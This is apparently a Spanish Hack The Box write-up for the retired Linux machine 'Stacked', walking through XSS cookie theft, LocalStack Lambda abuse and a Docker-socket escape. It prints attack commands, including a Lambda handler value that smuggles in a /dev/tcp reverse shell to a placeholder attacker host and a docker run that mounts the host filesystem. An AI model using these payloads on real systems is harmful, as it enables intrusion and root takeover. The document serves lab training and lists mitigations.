---
machine: Stacked
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, cloud, localstack, aws, xss, docker, privesc]
---

# Stacked — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Un vhost de portfolio tiene XSS y el buzón del administrador revela credenciales de LocalStack. La API de AWS simulada permite crear una función Lambda que ejecuta comandos en el contenedor de LocalStack. Una inyección de comandos en LocalStack da root en ese contenedor y el socket de Docker montado permite acceder al filesystem del host y ser root.

## Reconocimiento

```bash
nmap -Pn -sCV -p80,4566 <IP>
```

- `80` nginx y `4566` la API de LocalStack.
- `ffuf` con `Host: FUZZ.stacked.htb` encuentra `portfolio.stacked.htb` y `localstack.stacked.htb`.
- El portfolio permite enviar un mensaje al administrador.

## Enumeración

- El mensaje se refleja sin escapar y el administrador lo revisa con un navegador.
- Un XSS roba la cookie de sesión y da acceso al buzón.
- El buzón contiene credenciales de LocalStack y la URL de la API.

## Foothold

Con las credenciales se enumera LocalStack (`awslocal`) y se crea una función Lambda con un ZIP que lanza una reverse shell; al invocarla se ejecuta en el contenedor de LocalStack.

```bash
awslocal lambda create-function --function-name pwn --runtime python3.9 --handler lambda_function.handler --zip-file fileb://payload.zip --role arn:aws:iam::000000000000:role/lambda-role
awslocal lambda invoke --function-name pwn out.json
```

## Movimiento lateral

El nombre del handler de la Lambda se concatena sin escapar en la orden `docker create` de LocalStack. Un `;` en `--handler` ejecuta comandos como root dentro del contenedor de LocalStack.

```bash
aws --endpoint-url http://localstack.stacked.htb:4566 lambda create-function --function-name pwn --runtime nodejs12.x --handler 'index.handler;bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"' --zip-file fileb://payload.zip --role arn:aws:iam::000000000000:role/lambda-role
```

## Escalada de privilegios

Como root dentro de LocalStack se accede a `/var/run/docker.sock`. Se lanza un contenedor con `/` del host montado en `/mnt` y se escribe una clave SSH en `/mnt/root/.ssh/authorized_keys`.

```bash
docker -H unix:///var/run/docker.sock run --rm -it -u root -v /:/mnt lambci/lambda:nodejs12.x bash
```

## Evidencia

- XSS en el portfolio y buzón del administrador.
- Credenciales de LocalStack y Lambda maliciosa.
- Inyección de comandos y root en LocalStack.
- Socket Docker y root en el host.

## Lecciones aprendidas

- Un entorno cloud simulado puede tener credenciales reales del host.
- Una Lambda es ejecución de código si se controla la API.
- Montar `docker.sock` equivale a dar root en el host.

## Mitigación y detección

- No usar credenciales reales en LocalStack ni exponerlo.
- Aislar Lambda y limitar la API de inicialización.
- No montar el socket de Docker en contenedores accesibles.

## Referencias

- [0xdf — Stacked](https://0xdf.gitlab.io/2022/03/19/htb-stacked.html)
- [IppSec — Stacked](https://www.youtube.com/watch?v=aWXfEDIYZu8)
- [Hack The Box — Stacked](https://app.hackthebox.com/machines/stacked)
